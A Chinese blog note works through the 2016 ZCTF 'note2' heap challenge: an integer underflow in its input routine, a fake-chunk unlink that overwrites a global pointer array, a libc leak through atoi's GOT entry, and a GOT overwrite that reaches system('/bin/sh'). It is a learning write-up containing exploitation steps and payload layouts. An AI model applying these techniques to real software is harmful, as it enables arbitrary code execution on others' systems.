学习笔记：Unlink

Posted on 2026-04-07 Edited on 2026-04-19 In Notes Views:

2016 ZCTF note2

一、题目

2016 ZCTF note2

题目给出5个选项，存在申请、编辑、打印、删除函数。

这道题提供非常规堆溢出漏洞利用思路。仅看反编译，程序自定义单字节读取的输入函数 myread，输入函数限制读取字节数，看似是一个安全输入函数，不过问题就出在其中。

对于 create 函数，需要输入堆块大小 size，之后 myread 函数会以这个大小限制读取字节数。仔细看 myread 的实现，其中单字节读入所在的 for 循环，i 是无符号数，问题是 size 是 long 类型（有符号），但 1U 是无符号整数，两者相减会得到无符号整数，如果 size = 0，size - 1U = 0 - 1 = 0xFFFFFFFFFFFFFFFF（极大值）。而对于 create 函数，malloc(0) 根据 glibc 规定会分配 0x20 的最小堆块，于是我们就构造出了一个堆溢出。

二、调试

根据反编译，堆的用户区指针存储在一个全局数组处，通过偏移量获取指针。对于申请的chunk，简称为chunk0，其在全局数组处存储的用户区指针简称为 global[0]。

思路

通过构造堆溢出触发 unlink 修改 global 指针，使其指向 got 表，然后通过 printf 泄露libc基址，之后 got 劫持触发system。

此处 global 数组的特性使得构造的 unlink 堆块满足检查。

unlink 堆块

回顾一下 unlink 操作

FD是高地址堆块，BK是低地址堆块，注意fd在堆头偏移0x10处，bk在堆头偏移0x18处，P-> fd 实际上指 P+0x10 处的值，P-> bk 实际上指 P+0x18 处的值。也就是说，FD是fd指向的堆块，BK是bk指向的堆块。

理解两个写入操作，FD->bk实际是 FD+0x18，BK->fd实际是 BK+0x10，两个写入操作就是把BK写入到 FD 的0x10偏移处，把FD写入到 BK 的0x18偏移处。

同理，我们伪造 fd 和 bk，设置 fd = target_addr - 0x18，bk = content，于是FD = target_addr - 0x18，BK = content，然后执行写入操作，target_addr = content，content + 0x10 = target_addr - 0x18。

注意检查，要求 FD->bk == P（target_addr == P），BK->fd == P（content + 0x10 == P）。

这里先解释两个输入内容 fakechunk 和 overflow：

首先看 fakechunk ，输入p64(0) + p64(0x61) + p64(fd) + p64(bk)，伪造已释放的堆块，之后填充64字节，使得堆块大小和 size域 相同，而最后的0x60则是伪造的一个 prev_size域，为了满足unlink检查，表示前一个堆块0x60，且未被使用。

overflow 是第二次申请0字节，实际依然在chunk1的位置分配0x20的堆块。这里填充16字节a填满chunk1，之后的 0xa0 和 0x90 分别溢出到chunk2的元数据，代表前一个堆块大小0xa0以及本堆块大小0x90。这里实际上是把 fakechunk 和 chunk1 视为一个堆块，本质上依然是对fakechunk进行unlink操作。

接下来来看 unlink 操作：

一般来说，对于这种使用 global 数组存储堆指针的题目，我们需要让 global 指针指向 global 数组中的地址，然后通过 edit 修改global指针。本题 fd 和 bk 的设置根据之前的讲述可以理解为FD = global_array -0x18、BK = global_array - 0x10，然后unlink两个写入操作

  • (global_array -0x18) +0x18 = global_array - 0x10
  • (global_array - 0x10) + 0x10 = global_array -0x18

最终的赋值是第二步，也就是 global_array = global_array -0x18（表示global[0]处存储global_array地址偏移0x18）。注意之前提到的检查 FD->bk == BK->fd == P，此处global_array (global[0]) 存储 chunk0 用户区指针，即指向 fakechunk 头，此时 fakechunk 作为P，伪造的 fd 和 bk 必须如上才能满足检查。

泄露 libc

上述 unlink 操作过后，我们实现了 global[0] == global_array - 0x18，也就是说我们对chunk0的操作实际上是在 global_array - 0x18 地址处的操作。于是只要填充到 global 并控制其中的一个指针，使其为某函数的 got 表地址，通过 Show note 选项就可以泄露 libc 。

之后计算 libc 基址和 system 地址，不再赘述。

get shell

上一步已将 global[0] 覆写为 atoi@got，于是再次 edit chunk0，覆写got表中的 atoi 为 system 地址，于是之后调用 atoi 函数时实际调用 system，并且 atoi 和 system 均传入字符串指针，调用 atoi 函数时输入字符串 “/bin/sh” 即可调用 system(/bin/sh)。
